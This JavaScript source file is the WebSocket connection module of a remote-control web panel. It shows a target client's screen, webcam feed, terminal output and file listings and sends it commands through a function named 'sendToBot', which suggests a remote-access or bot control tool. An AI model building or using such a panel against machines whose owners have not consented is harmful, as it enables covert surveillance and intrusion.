// frontend/client_control/js/modules/websocket/connection.js
import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const decoder = new TextDecoder();
const $ = id => document.getElementById(id);

const updateUI = (id, val) => {
    const el = $(id);
    if (el) el.textContent = val ?? '...';
};

const setOnline = (isOnline) => {
    $('status-indicator')?.classList.toggle('online', isOnline);
    updateUI('status-text', isOnline ? 'online' : 'offline');
};

const parsePayload = (payload) => {
    try {
        return JSON.parse(decoder.decode(payload));
    } catch {
        return null;
    }
};

function handleIncomingData(buffer) {
    const pkg = decodePacket(buffer);
    if (!pkg) return;

    const { module, payload } = pkg;
    const { clientId } = AppState;

    if (module === 'DataScribe') {
        const raw = parsePayload(payload);
        if (!raw) return;

        const data = Array.isArray(raw)
            ? raw.find(c => c.id === clientId)
            : (raw[clientId] || raw);

        if (data) {
            data.ip && updateUI('display-ip', data.ip);
            data.id && updateUI('display-id', data.id);
            setOnline(data.status === 'online' || !!data.id);
        }
    } 
    else if (module === 'ScreenWatch') {
        payload.byteLength > 200 && renderScreenRGBA(payload);
    } 
    else if (module === 'Webcam') {
        window.renderWebcam?.(payload);
    } 
    else if (module === 'Terminal') {
        const json = parsePayload(payload);
        const detail = json || { status: 'stream', data: decoder.decode(payload) };
        window.dispatchEvent(new CustomEvent('terminalOutput', { detail }));
    } 
    else if (module === 'FileManager') {
        const json = parsePayload(payload);
        json && window.renderFileSystem?.(json);
    } 
    else {
        window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
    }
}

export function initControlConnection() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');
    const targetId = AppState.clientId;

    if (!token || !login || !targetId) return;

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${prot}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(targetId)}`;

    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';
    socket.onmessage = (e) => handleIncomingData(e.data);
    socket.onclose = () => setOnline(false);

    window.sendToBot = (mod, pay) => {
        socket?.readyState === 1 && socket.send(encodePacket(targetId, mod, pay));
    };
}